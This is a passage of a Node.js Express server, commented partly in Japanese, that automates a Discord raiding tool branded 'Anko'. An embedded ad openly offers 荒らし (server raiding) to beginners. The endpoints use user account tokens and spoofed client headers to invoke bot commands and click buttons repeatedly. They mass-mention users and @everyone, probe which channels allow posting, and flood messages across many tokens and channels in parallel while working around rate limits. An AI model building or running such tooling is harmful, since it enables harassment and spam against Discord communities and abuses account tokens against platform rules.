                # 🤍🩷💚🖤❤️🩵🩶🧡💙💛💜🤎❣️💗💝💓❤️‍🩹❤️‍🔥💞💘💖💕
                # 😉あんこちゃんだよ！
                # 🩵あんこ鯖では主にピクセルガンの無償代行
                # 🧡ワイワイ雑談‼️
                # 🩷荒らしを行っています
                # 🤍スマホ勢でも荒らし知識がなくても
                # 💚自作あんこアプリで最強荒らし勢になろう
                # 💜ピクセルガンも初日で最強になろ！
                # 🖤 闇落ちあんこちゃん🥹
                # https://excessive-chocolate-qomcybqhdz.edgeone.app/IMG_3973.gif
                # https://miserable-red-2wlieplbxn.edgeone.app/IMG_3948.gif
                # https://democratic-tomato-w8nercfjsr.edgeone.app/IMG_3949.gif
                # https://xeric-purple-2nw70kglwu.edgeone.app/IMG_3972.gif
                # https://nemtudo.me/e/aTPA
`,
                idsToMention: idsToMention,
                mentionCount: mentionCount || 3,
                channelId: channelId
            });
        }

        console.log(`Step 3: Clicking button ${count} times... (messageId=${buttonMessageId})`);
        let executed = 0;

        for (let i = 0; i < count; i++) {
            try {
                const clickPayload = {
                    type: 3,
                    nonce: generateSnowflake(),
                    session_id: sessionId,
                    channel_id: channelId,
                    message_id: buttonMessageId,
                    message_flags: 64,
                    application_id: CLIENT_ID,
                    data: {
                        component_type: 2,
                        custom_id: buttonCustomId
                    }
                };
                if (guildId) clickPayload.guild_id = guildId;

                const clickBoundary = '----WebKitFormBoundary' + generateBoundary();
                const clickFormBody = `--${clickBoundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${clickBoundary}--`;

                const clickHeaders = {
                    ...execHeaders,
                    'Content-Type': `multipart/form-data; boundary=${clickBoundary}`
                };

                await axios.post(`${DISCORD_API_BASE}/interactions`, clickFormBody, { headers: clickHeaders });
                executed++;
                
                if (i < count - 1) {
                    await delay(clickDelay);
                }
            } catch (clickError) {
                console.error(`Click ${i + 1} failed:`, clickError.response?.data || clickError.message);
                if (clickError.response?.status === 429) {
                    const retryAfter = (clickError.response?.data?.retry_after || 1) * 1000;
                    await delay(Math.max(retryAfter, 500));
                } else {
                    await delay(200);
                }
            }
        }

        res.json({
            success: true,
            messageId: buttonMessageId,
            channelId: channelId,
            buttonId: buttonCustomId,
            executed: executed,
            total: count,
            usedStoredData: !!storedButtonData
        });

    } catch (error) {
        console.error('Error creating button and clicking:', error.response?.data || error.message);
        res.status(500).json({ 
            success: false,
            error: error.response?.data?.message || error.message
        });
    }
});

app.post('/api/gateway-button-click', async (req, res) => {
    try {
        const { token, channelId, guildId, message, userIds, mentionCount, clickCount, clickDelayMs } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'token and channelId are required' });
        }

        const aankoCommand = getRegisteredCommand();
        if (!aankoCommand) {
            return res.status(500).json({ success: false, error: 'Bot command not registered yet. Please wait.' });
        }

        const options = [];
        // Check if message contains @everyone to set the everyone option
        const includeEveryone = message && message.includes('@everyone');
        let cleanMessage = message;
        if (includeEveryone) {
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        if (cleanMessage) {
            options.push({ type: 3, name: 'message', value: cleanMessage });
        }
        if (userIds && userIds.length > 0) {
            options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        }
        if (mentionCount) {
            options.push({ type: 4, name: 'mention_count', value: parseInt(mentionCount) });
        }
        if (includeEveryone) {
            options.push({ type: 5, name: 'everyone', value: true });
        }

        console.log('Using Gateway-based button click...');
        const result = await executeButtonViaGateway(
            token,
            channelId,
            guildId,
            CLIENT_ID,
            aankoCommand.id,
            aankoCommand.version,
            options,
            parseInt(clickCount) || 1,
            parseInt(clickDelayMs) || 100
        );

        res.json(result);

    } catch (error) {
        console.error('Gateway button error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/create-button-only', async (req, res) => {
    try {
        const { token, channelId, message, userIds, mentionCount, guildId: providedGuildId } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);

        let guildId = providedGuildId;
        if (!guildId) {
            try {
                const channelResponse = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}`, { headers });
                guildId = channelResponse.data.guild_id;
            } catch (e) {}
        }

        let aankoCommand = getRegisteredCommand();
        if (!aankoCommand) {
            return res.status(500).json({ success: false, error: 'Bot command not registered yet.' });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            let result = '';
            for (let i = 0; i < 32; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const sessionId = generateSessionId();
        const options = [];
        // Check if message contains @everyone to set the everyone option
        const includeEveryone = message && message.includes('@everyone');
        let cleanMessage = message;
        if (includeEveryone) {
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        if (cleanMessage && cleanMessage !== 'デフォルト7') options.push({ type: 3, name: 'message', value: cleanMessage });
        if (userIds && userIds.length > 0) options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        if (mentionCount) options.push({ type: 4, name: 'mention_count', value: mentionCount });
        if (includeEveryone) options.push({ type: 5, name: 'everyone', value: true });

        const payload = {
            type: 2, application_id: CLIENT_ID, channel_id: channelId, session_id: sessionId,
            nonce: generateSnowflake(),
            data: { version: aankoCommand.version, id: aankoCommand.id, name: 'aanko', type: 1, options, application_command: aankoCommand }
        };
        if (guildId) payload.guild_id = guildId;

        const boundary = '----WebKitFormBoundary' + generateBoundary();
        const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

        const execHeaders = {
            'Authorization': token,
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'X-Super-Properties': Buffer.from(JSON.stringify({
                os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
                browser_user_agent: "Mozilla/5.0", browser_version: "120.0.0.0", os_version: "10",
                release_channel: "stable", client_build_number: 251236
            })).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers: execHeaders });

        res.json({
            success: true,
            channelId,
            guildId,
            sessionId
        });

    } catch (error) {
        console.error('Error creating button:', error.response?.data || error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/detect-buttons', async (req, res) => {
    try {
        const { token, channelIds, maxRetries = 5, retryDelay = 1000 } = req.body;

        if (!channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'channelIds are required' });
        }

        const results = [];
        const pendingChannels = [...channelIds];

        for (let attempt = 0; attempt < maxRetries && pendingChannels.length > 0; attempt++) {
            if (attempt > 0) {
                await new Promise(resolve => setTimeout(resolve, retryDelay));
            }

            const stillPending = [];
            
            for (const channelId of pendingChannels) {
                const storedButton = getRecentButtonCreation(channelId);
                if (storedButton && storedButton.messageId && storedButton.buttonCustomId) {
                    results.push({
                        channelId,
                        messageId: storedButton.messageId,
                        buttonCustomId: storedButton.buttonCustomId,
                        found: true,
                        source: 'stored',
                        attempt: attempt + 1
                    });
                } else {
                    stillPending.push(channelId);
                }
            }
            
            pendingChannels.length = 0;
            pendingChannels.push(...stillPending);
        }

        for (const channelId of pendingChannels) {
            if (token) {
                try {
                    const headers = getDiscordHeaders(token);
                    const messagesResponse = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}/messages?limit=15`, { headers });
                    
                    let found = false;
                    for (const msg of messagesResponse.data) {
                        if (msg.author.id === CLIENT_ID && msg.components?.length > 0) {
                            for (const row of msg.components) {
                                for (const comp of row.components || []) {
                                    if (comp.type === 2 && comp.custom_id && 
                                        (comp.custom_id.startsWith('aanko_t_') || comp.custom_id.startsWith('aanko_p_'))) {
                                        results.push({
                                            channelId,
                                            messageId: msg.id,
                                            buttonCustomId: comp.custom_id,
                                            found: true,
                                            source: 'api'
                                        });
                                        found = true;
                                        break;
                                    }
                                }
                                if (found) break;
                            }
                            if (found) break;
                        }
                    }
                    
                    if (!found) {
                        results.push({ channelId, found: false });
                    }
                } catch (e) {
                    results.push({ channelId, found: false, error: e.message });
                }
            } else {
                results.push({ channelId, found: false, error: 'No stored data after retries' });
            }
        }

        res.json({ success: true, results, totalChannels: channelIds.length, foundCount: results.filter(r => r.found).length });

    } catch (error) {
        console.error('Error detecting buttons:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/detect-buttons-improved', async (req, res) => {
    try {
        const { tokens, channelIds, maxRetries = 10, retryDelay = 500 } = req.body;

        if (!channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'channelIds are required' });
        }

        const tokenList = Array.isArray(tokens) ? tokens : (tokens ? [tokens] : []);
        const token = tokenList[0];
        
        const results = [];
        const pendingChannels = [...channelIds];
        const foundChannels = new Set();

        for (let attempt = 0; attempt < maxRetries && pendingChannels.length > 0; attempt++) {
            if (attempt > 0) {
                await delay(retryDelay);
            }

            const stillPending = [];
            
            for (const channelId of pendingChannels) {
                if (foundChannels.has(channelId)) continue;
                
                const storedButton = getRecentButtonCreation(channelId);
                if (storedButton && storedButton.messageId && storedButton.buttonCustomId) {
                    results.push({
                        channelId,
                        messageId: storedButton.messageId,
                        buttonCustomId: storedButton.buttonCustomId,
                        found: true,
                        source: 'stored',
                        attempt: attempt + 1
                    });
                    foundChannels.add(channelId);
                } else {
                    stillPending.push(channelId);
                }
            }
            
            pendingChannels.length = 0;
            pendingChannels.push(...stillPending);
        }

        if (tokenList.length > 0 && pendingChannels.length > 0) {
            for (const channelId of pendingChannels) {
                if (foundChannels.has(channelId)) continue;
                
                let channelFound = false;
                
                for (const tryToken of tokenList) {
                    if (channelFound) break;
                    
                    const headers = getDiscordHeaders(tryToken);
                    
                    for (let apiAttempt = 0; apiAttempt < 2; apiAttempt++) {
                        try {
                            if (apiAttempt > 0) await delay(300);
                            
                            const messagesResponse = await axios.get(
                                `${DISCORD_API_BASE}/channels/${channelId}/messages?limit=20`, 
                                { headers }
                            );
                            
                            for (const msg of messagesResponse.data) {
                                if (msg.author.id === CLIENT_ID && msg.components?.length > 0) {
                                    for (const row of msg.components) {
                                        for (const comp of row.components || []) {
                                            if (comp.type === 2 && comp.custom_id && 
                                                (comp.custom_id.startsWith('aanko_t_') || comp.custom_id.startsWith('aanko_p_'))) {
                                                results.push({
                                                    channelId,
                                                    messageId: msg.id,
                                                    buttonCustomId: comp.custom_id,
                                                    found: true,
                                                    source: 'api',
                                                    tokenIndex: tokenList.indexOf(tryToken),
                                                    apiAttempt: apiAttempt + 1
                                                });
                                                foundChannels.add(channelId);
                                                channelFound = true;
                                                break;
                                            }
                                        }
                                        if (channelFound) break;
                                    }
                                    if (channelFound) break;
                                }
                            }
                            
                            if (channelFound) break;
                            
                        } catch (e) {
                            console.log(`API attempt with token ${tokenList.indexOf(tryToken)} failed for channel ${channelId}:`, e.message);
                            if (e.response?.status === 429) {
                                const waitTime = (e.response?.data?.retry_after || 1) * 1000;
                                await delay(waitTime);
                            } else if (e.response?.status === 403 || e.response?.status === 404) {
                                break;
                            }
                        }
                    }
                }
                
                if (!channelFound && !foundChannels.has(channelId)) {
                }
            }
        }

        for (const channelId of channelIds) {
            if (!foundChannels.has(channelId) && !results.find(r => r.channelId === channelId)) {
                results.push({ channelId, found: false, error: 'No button found after all attempts' });
            }
        }

        res.json({ 
            success: true, 
            results, 
            totalChannels: channelIds.length, 
            foundCount: results.filter(r => r.found).length 
        });

    } catch (error) {
        console.error('Error detecting buttons (improved):', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/click-button-only', async (req, res) => {
    try {
        const { token, channelId, guildId, messageId, buttonCustomId, sessionId, clickCount, clickDelayMs } = req.body;

        if (!token || !channelId || !messageId || !buttonCustomId) {
            return res.status(400).json({ error: 'Missing required parameters' });
        }

        const count = Math.max(parseInt(clickCount) || 1, 1);
        const clickDelay = Math.max(parseFloat(clickDelayMs) || 500, 100);

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateBoundary = () => {
            let result = '';
            for (let i = 0; i < 16; i++) result += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
            return result;
        };

        const execHeaders = {
            'Authorization': token,
            'X-Super-Properties': Buffer.from(JSON.stringify({
                os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
                browser_user_agent: "Mozilla/5.0", browser_version: "120.0.0.0", os_version: "10",
                release_channel: "stable", client_build_number: 251236
            })).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        let executed = 0;
        for (let i = 0; i < count; i++) {
            try {
                const clickPayload = {
                    type: 3, nonce: generateSnowflake(), session_id: sessionId || generateSnowflake(),
                    channel_id: channelId, message_id: messageId, message_flags: 64,
                    application_id: CLIENT_ID,
                    data: { component_type: 2, custom_id: buttonCustomId }
                };
                if (guildId) clickPayload.guild_id = guildId;

                const boundary = '----WebKitFormBoundary' + generateBoundary();
                const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(clickPayload)}\r\n--${boundary}--`;

                await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, {
                    headers: { ...execHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                });
                executed++;
                
                if (i < count - 1) await delay(clickDelay);
            } catch (clickError) {
                console.error(`Click ${i + 1} failed:`, clickError.response?.data || clickError.message);
                if (clickError.response?.status === 429) {
                    const retryAfter = (clickError.response?.data?.retry_after || 1) * 1000;
                    await delay(Math.max(retryAfter, 500));
                } else {
                    await delay(200);
                }
            }
        }

        res.json({ success: true, executed, total: count });

    } catch (error) {
        console.error('Error clicking button:', error.response?.data || error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/check-channel-permissions', async (req, res) => {
    try {
        const { token, guildId } = req.body;
        
        if (!token || !guildId) {
            return res.status(400).json({
                success: false,
                error: 'トークンとサーバーIDが必要です'
            });
        }
        
        const headers = getDiscordHeaders(token);
        const VIEW_CHANNEL = 1024n;
        const SEND_MESSAGES = 2048n;
        const MENTION_EVERYONE = 131072n;
        const USE_APPLICATION_COMMANDS = 2147483648n;
        const USE_EXTERNAL_APPS = 1125899906842624n;
        const ADMINISTRATOR = 8n;
        const CREATE_PUBLIC_THREADS = 34359738368n;
        const CREATE_PRIVATE_THREADS = 68719476736n;
        const SEND_MESSAGES_IN_THREADS = 274877906944n;
        
        let userRoleIds = [];
        let userId = null;
        let basePermissions = 0n;
        let isAdmin = false;
        let username = '';
        
        try {
            const meResponse = await axios.get(`${DISCORD_API_BASE}/users/@me`, { headers });
            userId = meResponse.data.id;
            username = meResponse.data.username;
            
            const memberResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}/member`, { headers });
            userRoleIds = memberResponse.data.roles || [];
            
            const rolesResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/roles`, { headers });
            const guildRoles = rolesResponse.data;
            const roleMap = new Map();
            guildRoles.forEach(r => roleMap.set(r.id, r));
            
            const everyoneRole = roleMap.get(guildId);
            if (everyoneRole) {
                basePermissions = BigInt(everyoneRole.permissions || '0');
            }
            
            for (const roleId of userRoleIds) {
                const role = roleMap.get(roleId);
                if (role) {
                    basePermissions |= BigInt(role.permissions || '0');
                }
            }
            
            isAdmin = (basePermissions & ADMINISTRATOR) !== 0n;
        } catch (e) {
            console.log('[check-channel-permissions] Could not fetch user info:', e.message);
            return res.status(400).json({
                success: false,
                error: 'ユーザー情報の取得に失敗しました: ' + e.message
            });
        }
        
        const channelsResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
        const allChannels = channelsResponse.data.filter(ch => ch.type === 0);
        
        const results = [];
        
        for (const channel of allChannels) {
            const slowModeSeconds = channel.rate_limit_per_user || 0;
            
            if (isAdmin) {
                let reason = '管理者権限';
                if (slowModeSeconds > 0) {
                    reason += ` (低速モード: ${slowModeSeconds}秒)`;
                }
                results.push({
                    id: channel.id,
                    name: channel.name,
                    canView: true,
                    canSendMessages: true,
                    canMentionEveryone: true,
                    canUseAppCommands: true,
                    canCreatePublicThreads: true,
                    canCreatePrivateThreads: true,
                    canSendInThreads: true,
                    status: 'ok',
                    reason: reason,
                    slowMode: slowModeSeconds
                });
                continue;
            }
            
            const overwrites = channel.permission_overwrites || [];
            let permissions = basePermissions;
            
            const everyoneOverwrite = overwrites.find(o => o.id === guildId);
            if (everyoneOverwrite) {
                permissions &= ~BigInt(everyoneOverwrite.deny || '0');
                permissions |= BigInt(everyoneOverwrite.allow || '0');
            }
            
            let roleAllow = 0n;
            let roleDeny = 0n;
            for (const roleId of userRoleIds) {
                const roleOverwrite = overwrites.find(o => o.id === roleId && o.type === 0);
                if (roleOverwrite) {
                    roleAllow |= BigInt(roleOverwrite.allow || '0');
                    roleDeny |= BigInt(roleOverwrite.deny || '0');
                }
            }
            permissions &= ~roleDeny;
            permissions |= roleAllow;
            
            if (userId) {
                const userOverwrite = overwrites.find(o => o.id === userId && o.type === 1);
                if (userOverwrite) {
                    permissions &= ~BigInt(userOverwrite.deny || '0');
                    permissions |= BigInt(userOverwrite.allow || '0');
                }
            }
            
            const canView = (permissions & VIEW_CHANNEL) !== 0n;
            const canSendMessages = (permissions & SEND_MESSAGES) !== 0n;
            const canMentionEveryone = (permissions & MENTION_EVERYONE) !== 0n;
            const hasAppCommands = (permissions & USE_APPLICATION_COMMANDS) !== 0n;
            const hasExternalApps = (permissions & USE_EXTERNAL_APPS) !== 0n;
            const canCreatePublicThreads = (permissions & CREATE_PUBLIC_THREADS) !== 0n;
            const canCreatePrivateThreads = (permissions & CREATE_PRIVATE_THREADS) !== 0n;
            const canSendInThreads = (permissions & SEND_MESSAGES_IN_THREADS) !== 0n;
            // Only require external apps permission (not app commands) for external bot commands
            const canUseExternalApps = hasExternalApps;
            
            let status = 'ok';
            let reason = '';
            
            if (!canView) {
                status = 'no_view';
                reason = 'チャンネル閲覧権限なし';
            } else if (!canSendMessages) {
                status = 'no_send';
                reason = 'メッセージ送信権限なし';
            } else if (!canUseExternalApps) {
                status = 'no_app_commands';
                reason = '外部アプリ使用不可';
            } else if (slowModeSeconds > 0) {
                reason = `低速モード: ${slowModeSeconds}秒 (送信可能)`;
            }
            
            results.push({
                id: channel.id,
                name: channel.name,
                canView,
                canSendMessages,
                canMentionEveryone,
                canUseExternalApps,
                canCreatePublicThreads,
                canCreatePrivateThreads,
                canSendInThreads,
                status,
                reason,
                slowMode: slowModeSeconds
            });
        }
        
        const okChannels = results.filter(r => r.status === 'ok');
        const noViewChannels = results.filter(r => r.status === 'no_view');
        const noSendChannels = results.filter(r => r.status === 'no_send');
        const noAppCommandsChannels = results.filter(r => r.status === 'no_app_commands');
        
        res.json({
            success: true,
            user: { id: userId, username },
            isAdmin,
            summary: {
                total: results.length,
                ok: okChannels.length,
                noView: noViewChannels.length,
                noSend: noSendChannels.length,
                noAppCommands: noAppCommandsChannels.length
            },
            channels: results
        });
        
    } catch (error) {
        console.error('[check-channel-permissions] Error:', error.response?.data || error.message);
        res.status(500).json({ 
            success: false, 
            error: error.response?.data?.message || error.message 
        });
    }
});

app.post('/api/test-external-command', async (req, res) => {
    try {
        const { token, channelId, guildId: providedGuildId } = req.body;

        if (!token) {
            return res.status(400).json({ 
                success: false, 
                error: 'トークンが必要です' 
            });
        }
        
        if (!channelId && !providedGuildId) {
            return res.status(400).json({ 
                success: false, 
                error: 'チャンネルIDまたはサーバーIDが必要です' 
            });
        }

        const userHeaders = getDiscordHeaders(token);
        
        let guildId = providedGuildId;
        if (!guildId) {
            try {
                const channelResponse = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}`, { headers: userHeaders });
                guildId = channelResponse.data.guild_id;
            } catch (e) {
                console.log('Could not fetch guild_id:', e.message);
            }
        }

        const atestCommand = getRegisteredAtestCommand();
        if (!atestCommand) {
            return res.status(500).json({ 
                success: false, 
                error: '/atest コマンドがまだ登録されていません。少し待ってから再試行してください。' 
            });
        }

        console.log(`Testing external command via /atest: channel=${channelId}, guild=${guildId}`);

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const generateBoundary = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const sessionId = generateSessionId();
        const nonce = generateSnowflake();
        
        const testId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
        
        const applicationCommandWithOption = {
            ...atestCommand,
            options: [
                {
                    type: 3,
                    name: 'test_id',
                    description: 'テスト識別子',
                    required: false
                }
            ]
        };

        const payload = {
            type: 2,
            application_id: CLIENT_ID,
            channel_id: channelId,
            session_id: sessionId,
            nonce: nonce,
            data: {
                version: atestCommand.version,
                id: atestCommand.id,
                name: 'atest',
                type: 1,
                options: [
                    {
                        type: 3,
                        name: 'test_id',
                        value: testId
                    }
                ],
                application_command: applicationCommandWithOption
            }
        };
        
        console.log(`Generated testId for /atest: ${testId}`);

        if (guildId) {
            payload.guild_id = guildId;
        }

        const boundary = '----WebKitFormBoundary' + generateBoundary();
        const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

        const superProperties = {
            os: "Windows",
            browser: "Chrome",
            device: "",
            system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            browser_version: "120.0.0.0",
            os_version: "10",
            release_channel: "stable",
            client_build_number: 251236,
            client_event_source: null
        };

        const execHeaders = {
            'Authorization': token,
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'X-Discord-Timezone': 'Asia/Tokyo',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        try {
            await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers: execHeaders });
            console.log('/atest command executed via user token');
        } catch (execError) {
            console.log('/atest execution error:', execError.response?.data || execError.message);
            
            if (execError.response?.status === 403) {
                return res.json({ 
                    success: true, 
                    result: 'no_access',
                    message: 'このチャンネルでコマンドを実行する権限がありません。'
                });
            }
            throw execError;
        }

        let foundMessage = null;
        let attempts = 0;
        const maxAttempts = 7;
        const pollInterval = 800;
        
        const expectedContent = `test:${testId}`;
        console.log(`Polling for /atest message with content: ${expectedContent}`);

        for (let i = 0; i < maxAttempts; i++) {
            attempts++;
            await delay(pollInterval);
            
            try {
                const messagesResponse = await axios.get(
                    `${DISCORD_API_BASE}/channels/${channelId}/messages?limit=15`,
                    { headers: userHeaders }
                );
                
                foundMessage = messagesResponse.data.find(msg => {
                    if (msg.author.id !== CLIENT_ID) return false;
                    if (msg.content !== expectedContent) return false;
                    return true;
                });
                
                if (foundMessage) {
                    console.log(`Found /atest message on attempt ${attempts}: ${foundMessage.id}, content: ${foundMessage.content}`);
                    break;
                }
            } catch (readError) {
                console.log(`Message poll attempt ${attempts} error:`, readError.response?.data || readError.message);
                if (readError.response?.status === 403) {
                    return res.json({ 
                        success: true, 
                        result: 'no_access',
                        message: 'チャンネルのメッセージを読む権限がありません。',
                        attempts
                    });
                }
            }
        }

        let deleteStatus = null;
        if (foundMessage) {
            try {
                await axios.delete(
                    `${DISCORD_API_BASE}/channels/${channelId}/messages/${foundMessage.id}`,
                    { headers: userHeaders }
                );
                deleteStatus = 'deleted';
                console.log(`Test message deleted by user token: ${foundMessage.id}`);
            } catch (deleteError) {
                console.log('Failed to delete test message:', deleteError.response?.data || deleteError.message);
                if (deleteError.response?.status === 403) {
                    deleteStatus = 'no_permission';
                } else {
                    deleteStatus = 'failed';
                }
            }
        }

        if (foundMessage) {
            let deleteNote = '';
            if (deleteStatus === 'deleted') {
                deleteNote = '（テストメッセージは削除しました）';
            } else if (deleteStatus === 'no_permission') {
                deleteNote = '（メッセージ削除権限がないため、手動で削除してください）';
            } else {
                deleteNote = '（メッセージの削除に失敗しました）';
            }
            
            res.json({ 
                success: true, 
                result: 'external_enabled',
                message: `成功！外部アプリコマンドが有効です。メッセージが全員に見える状態でした。${deleteNote}`,
                messageId: foundMessage.id,
                deleteStatus,
                attempts
            });
        } else {
            res.json({ 
                success: true, 
                result: 'external_disabled',
                message: '外部アプリコマンドが無効です。メッセージがephemeral（本人のみ表示）になっています。このサーバーでは外部コマンドが許可されていません。',
                attempts
            });
        }

    } catch (error) {
        console.error('Error testing external command:', error.response?.data || error.message);
        
        if (error.response?.status === 403) {
            res.json({ 
                success: true, 
                result: 'no_access',
                message: 'このチャンネルにアクセスする権限がありません。'
            });
        } else {
            res.status(500).json({ 
                success: false, 
                error: error.response?.data?.message || error.message 
            });
        }
    }
});

// Direct Message Send API - Smart rate limit handling with per-channel tracking
app.post('/api/send-dm', async (req, res) => {
    const operationId = startOperation('direct-message');
    
    try {
        const { tokens, channelIds, message, userIds, mentionCount, count, delayMs, includeRandomChars, totalCount, includeEveryone, pollData } = req.body;

        if (!tokens || tokens.length === 0) {
            endOperation(operationId);
            return res.status(400).json({ error: 'At least one token is required' });
        }

        if (!channelIds || channelIds.length === 0) {
            endOperation(operationId);
            return res.status(400).json({ error: 'At least one channel ID is required' });
        }

        const perChannelCount = Math.max(parseInt(count) || 1, 1);
        const userDelay = Math.max(parseInt(delayMs) || 10, 0);
        const maxTotal = parseInt(totalCount) || 0;
        const addRandomChars = includeRandomChars !== false;
        
        const mentionIds = userIds && userIds.length > 0 ? userIds : [];
        const selectedMentions = mentionCount && mentionCount > 0 ? 
            Math.min(mentionCount, mentionIds.length) : 0;

        const defaultMessage = config.DEFAULT_MESSAGE;

        // If user provided custom message (not null/empty), append " by Anko"
        let customMessage = message;
        if (message && message.trim() !== '') {
            customMessage = message + ' by Anko';
        }

        // Smart rate limit tracking per channel
        // Safe rate: 300ms per channel - reduces 429 errors
        const channelCount = channelIds.length;
        const DISCORD_CHANNEL_RATE_LIMIT_MS = 300; // 0.3 second per channel (balanced speed/stability)
        const optimalDelay = Math.max(userDelay, Math.ceil(DISCORD_CHANNEL_RATE_LIMIT_MS / channelCount));
        
        // Track last send time per channel to avoid rate limits
        const channelLastSend = {};
        const channelRateLimitUntil = {};
        for (const cid of channelIds) {
            channelLastSend[cid] = 0;
            channelRateLimitUntil[cid] = 0;
        }

        console.log(`[send-dm] START SMART: ${tokens.length}tok x ${channelCount}ch, ${perChannelCount}msg/ch`);
        console.log(`[send-dm] User delay: ${userDelay}ms, Optimal delay: ${optimalDelay}ms (1000/${channelCount}=${Math.ceil(1000/channelCount)}ms)`);

        const results = { success: 0, failed: 0, total: 0, channels: {}, rounds: 0, rateLimitHits: 0 };
        for (const cid of channelIds) {
            results.channels[cid] = { success: 0, failed: 0 };
        }

        // 並列処理用の高速送信関数
        const sendMessagesParallel = async (tokens, channelIds, perChannelCount) => {
            const channelPromises = [];
            
            // チャンネル別に並列実行
            for (const channelId of channelIds) {
                const channelPromise = (async () => {
                    let channelResults = { success: 0, failed: 0, total: 0 };
                    
                    for (const token of tokens) {
                        if (shouldCancel(operationId)) break;
                        
                        for (let i = 0; i < perChannelCount; i++) {
                            if (shouldCancel(operationId)) break;
                            if (maxTotal > 0 && totalSent >= maxTotal) break;
                            
                            const result = await sendMessage(token, channelId);
                            
                            if (result.cancelled) {
                                return { ...channelResults, cancelled: true };
                            }
                            
                            if (result.success) {
                                channelResults.success++;
                            } else {
                                channelResults.failed++;
                            }
                            channelResults.total++;
                            totalSent++;
                            
                            // 最適化された遅延（チャンネル数で分散）
                            const optimizedDelay = Math.max(userDelay, Math.ceil(DISCORD_CHANNEL_RATE_LIMIT_MS / channelIds.length));
                            if (optimizedDelay > 0) {
                                await delay(optimizedDelay);
                            }
                        }
                    }
                    return channelResults;
                })();
                
                channelPromises.push(channelPromise);
            }
            
            // 全チャンネルの並列実行完了を待機
            const channelResults = await Promise.all(channelPromises);
            
            // 結果をマージ
            let totalResults = { success: 0, failed: 0, total: 0, cancelled: false };
            channelResults.forEach((result, index) => {
                const channelId = channelIds[index];
                results.channels[channelId].success += result.success;
                results.channels[channelId].failed += result.failed;
                totalResults.success += result.success;
                totalResults.failed += result.failed;
